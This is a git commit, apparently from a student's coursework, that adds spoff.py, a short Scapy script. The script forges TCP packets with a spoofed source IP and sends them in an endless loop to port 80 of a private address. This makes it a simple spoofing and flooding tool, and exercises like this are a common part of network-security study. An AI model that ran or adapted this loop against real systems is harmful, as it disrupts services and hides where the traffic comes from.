a501218372c56ba3fee0f97fde9312e8565147c6
omkar2004jainak <omkarjainak2021.it@mmcoe.edu.in>
2024-05-09 11:13:43 +0530

    cs

--- spoff.py
+++ spoff.py
@@ -1,1 +1,12 @@
-cd
+from scapy.all import *
+
+A = "172.16.7.75"   # Spoofed source IP address
+B = "172.16.7.75" # Destination IP address
+C = RandShort()     # Source port (random)
+D = 80              # Destination port
+payload = "yada yada yada" # Packet payload
+
+while True:
+    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
+    send(spoofed_packet)
+    print(spoofed_packet)
